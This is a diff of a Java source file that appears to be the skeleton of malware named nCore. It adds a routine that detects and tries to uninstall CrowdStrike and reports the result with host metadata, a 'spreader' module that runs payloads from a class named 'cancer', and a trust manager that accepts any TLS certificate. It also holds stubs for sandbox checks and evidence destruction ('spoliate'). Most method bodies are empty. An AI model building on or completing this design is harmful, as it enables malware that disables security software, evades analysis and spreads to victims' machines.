@@ -9,10 +9,10 @@ import java.util.Hashtable;
 import java.util.Arrays;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
+
 import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.ParserConfigurationException;
-import javax.xml.transform.TransformerFactory;
 import javax.xml.transform.dom.DOMSource;
 import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
@@ -38,13 +38,14 @@ import java.security.cert.X509Certificate;
 
 class nConfig
 {
-    public int locTcpPort = 49602;
-    public String encKey = "";
-    public int metastasize = 0;
-    public String uri = "";
-    public int isKeystone = 0;
-    public int stutterMin = 10;
-    public int stutterMax = 50;
+    public static int locTcpPort = 49602;
+    public static String encKey = "";
+    public static int metastasize = 0;
+    public static String uri = "";
+    public static int isKeystone = 0;
+    public static int stutterMin = 10;
+    public static int stutterMax = 50;
+    public static String struck = "false";
 }
 
 public class nCore
@@ -65,7 +66,7 @@ public class nCore
         //check if crowdstrike is installed and attempt uninstall if it is
         if (cm.getCStrike())
         {
-            cm.counterStrike();
+            nConfig.struck = String.valueOf(cm.counterStrike());
         }
 
         modLib.getUpdate();
@@ -116,8 +117,16 @@ public class nCore
 
         public class autoLib
         {
-            private static Document metastasize()
+            private void metastasize()
             {
+                utilitarian nUtil = new utilitarian();
+                
+                ArrayList<Method> methList = nUtil.getClassMethods("modLib.autoLib.cancer");
+                for (int a=0; a<methList.size(); a++)
+                {
+                    //need to put the code to thread in here
+                    threader();
+                }
                 // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
             }
 
@@ -142,11 +151,10 @@ public class nCore
                 metadata.put("jre",System.getProperty("java.runtime.version"));
                 metadata.put("interfaces",nUtil.getAddress().toString());
                 metadata.put("hostname",nUtil.getHostname());
+                metadata.put("crowdstruck",nConfig.struck);
 
                 return nUtil.outputToXmlDoc("metadata",metadata);
             }
-
-            
         }
 
         private class nixLib
@@ -162,7 +170,7 @@ public class nCore
 
     } 
 
-    private class utilitarian
+    private static class utilitarian
     {
 
         private Method getMethodByName(String methodName)
@@ -171,6 +179,11 @@ public class nCore
         }
 
         private Class getClassByName(String className)
+        {
+
+        }
+
+        private ArrayList<Method> getClassMethods(String className)
         {
 
         }
@@ -262,7 +275,7 @@ public class nCore
         {
             //stackoverflow provided boilerplate
             SSLContext sslCon = SSLContext.getInstance("TLS");
-            sslCon.init(null, new TrustManager[] {new CertAutoTruster()}, null);
+            sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
 
         }
 
@@ -271,16 +284,44 @@ public class nCore
 
         }
 
-        class CertAutoTruster implements X509TrustManager
-        {
+        //stackoverflow
+        public class InvalidCertificateTrustManager implements X509TrustManager{
             @Override
-            public X509Certificate[] getAcceptedIssuers() 
-            {
+            public X509Certificate[] getAcceptedIssuers() {
                 return null;
             }
 
             @Override
-            public void checkServerTrusted(X509Cet)
+            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
+
+            }
+
+            @Override
+            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
+            }
+        }
+    }
+
+    private static class countermeasures
+    {
+        private boolean chkSandbox()
+        {
+
+        }
+
+        private boolean spoliate()
+        {
+
+        }
+
+        private boolean counterStrike()
+        {
+
+        }
+
+        private boolean getCStrike()
+        {
+
         }
     }
 
@@ -302,29 +343,6 @@ public class nCore
         }
     
         private byte[] doWork(byte[] plaintext, byte[] nonce, int mode) throws Exception
-        {
-
-        }
-    }
-
-    private static class countermeasures
-    {
-        private boolean chkSandbox()
-        {
-
-        }
-
-        private void spoliate()
-        {
-
-        }
-
-        private void counterStrike()
-        {
-
-        }
-
-        private boolean getCStrike()
         {
 
         }
